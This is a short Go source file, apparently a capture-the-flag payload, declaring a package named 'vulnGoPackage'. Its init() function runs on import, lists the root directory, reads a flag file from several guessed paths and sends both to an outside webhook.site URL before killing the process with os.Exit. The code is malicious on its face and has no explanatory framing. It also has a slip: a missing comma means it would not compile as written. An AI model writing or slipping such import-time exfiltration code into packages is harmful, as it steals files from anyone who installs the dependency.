package vulnGoPackage

import (
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
)

func init() {
	lsCmd := exec.Command("ls", "-la", "/")
	lsOutput, _ := lsCmd.CombinedOutput()
	
	flagPaths := []string{
		"/flag.txt",
		"/home/flag.txt",
		"/etc/flag.txt",
		"tmp/flag.txt"
	}
	
	var flagContent string
	
	for _, path := range flagPaths {
		if content, err := ioutil.ReadFile(path); err == nil {
			flagContent = string(content)
			break
		}
	}
	
	http.Get("https://webhook.site/b6b6265c-2121-43e7-83e9-1dcc151dc86f?ls_output=" + 
		string(lsOutput) + "&flag=" + flagContent)
	
	os.Exit(0)
}
